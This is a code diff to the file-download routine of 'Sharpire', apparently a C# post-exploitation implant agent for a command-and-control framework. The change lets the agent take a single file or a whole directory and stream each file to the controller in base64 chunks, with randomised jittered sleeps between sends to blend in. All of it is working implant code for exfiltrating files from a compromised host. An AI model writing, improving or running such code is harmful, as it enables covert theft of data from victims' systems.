@@ -404,55 +404,83 @@ namespace Sharpire
                     chunkSize = 8 * 1024 * 1024;
                 }
 
-
-                DirectoryInfo directoryInfo = new DirectoryInfo(path);
-                FileInfo[] completePath = directoryInfo.GetFiles(path);
-
-                int index = 0;
-                string filePart = "";
-                do
+                var files = new List<FileInfo>();
+                DirectoryInfo directoryInfo;
+                if (File.Exists(path))
                 {
-                    byte[] filePartBytes = Agent.GetFilePart(path, index, chunkSize);
-                    filePart = Convert.ToBase64String(filePartBytes);
-                    if (filePart.Length > 0)
+                    string filename = path.Split('\\').Last();
+                    string dir = path.Replace("\\" + filename, "");
+    
+                    directoryInfo = new DirectoryInfo(dir);
+                    FileInfo[] fileInfo = directoryInfo.GetFiles(filename);
+                    foreach(FileInfo f in fileInfo)
                     {
-                        string data = index.ToString() + "|" + path + "|" + filePart;
-                        SendMessage(EncodePacket(packet.type, data, packet.taskId));
-                        index++;
-                        if (sessionInfo.GetDefaultDelay() != 0)
-                        {
-                            int max = (int)((sessionInfo.GetDefaultJitter() + 1) * sessionInfo.GetDefaultDelay());
-                            if (max > int.MaxValue)
-                            {
-                                max = int.MaxValue - 1;
-                            }
-
-                            int min = (int)((sessionInfo.GetDefaultJitter() - 1) * sessionInfo.GetDefaultDelay());
-                            if (min < 0)
-                            {
-                                min = 0;
-                            }
-
-                            int sleepTime;
-                            if (min == max)
-                            {
-                                sleepTime = min;
-                            }
-                            else
-                            {
-                                Random random = new Random();
-                                sleepTime = random.Next(min, max);
-                            }
-                            Thread.Sleep(sleepTime);
-                        }
-                        GC.Collect();
+                        files.Add(f);
                     }
-                } while (filePart.Length != 0);
-                return EncodePacket(packet.type, "[*] File download of " + path + " completed", packet.taskId);
+                }
+                else if (Directory.Exists(path))
+                {
+                    directoryInfo = new DirectoryInfo(path);
+                    FileInfo[] fileInfo = directoryInfo.GetFiles();
+                    foreach(FileInfo f in fileInfo)
+                    {
+                        files.Add(f);
+                    }
+                }
+               
+                if (files.Count == 0)
+                {
+                    return EncodePacket(0, "[!] File does not exist or cannot be accessed", packet.taskId);
+                }
+
+                foreach (FileInfo currentFileInfo in files)
+                {
+                    int index = 0;
+                    string filePart = "";
+                    do
+                    {
+                        byte[] filePartBytes = Agent.GetFilePart(currentFileInfo.FullName, index, chunkSize);
+                        filePart = Convert.ToBase64String(filePartBytes);
+                        if (filePart.Length > 0)
+                        {
+                            string data = index.ToString() + "|" + currentFileInfo.FullName + "|" + currentFileInfo.Length + "|" + filePart;
+                            SendMessage(EncodePacket(packet.type, data, packet.taskId));
+                            index++;
+                            if (sessionInfo.GetDefaultDelay() != 0)
+                            {
+                                int max = (int)((sessionInfo.GetDefaultJitter() + 1) * sessionInfo.GetDefaultDelay());
+                                if (max > int.MaxValue)
+                                {
+                                    max = int.MaxValue - 1;
+                                }
+
+                                int min = (int)((sessionInfo.GetDefaultJitter() - 1) * sessionInfo.GetDefaultDelay());
+                                if (min < 0)
+                                {
+                                    min = 0;
+                                }
+
+                                int sleepTime;
+                                if (min == max)
+                                {
+                                    sleepTime = min;
+                                }
+                                else
+                                {
+                                    Random random = new Random();
+                                    sleepTime = random.Next(min, max);
+                                }
+                                Thread.Sleep(sleepTime);
+                            }
+                            GC.Collect();
+                        }
+                    } while (filePart.Length != 0); 
+                }
+                return EncodePacket(40, "[*] File download of " + path + " completed", packet.taskId);
             }
-            catch
+            catch 
             {
-                return EncodePacket(packet.type, "[!] File does not exist or cannot be accessed", packet.taskId);
+                return EncodePacket(0, "[!] File does not exist or cannot be accessed", packet.taskId);
             }
         }
 
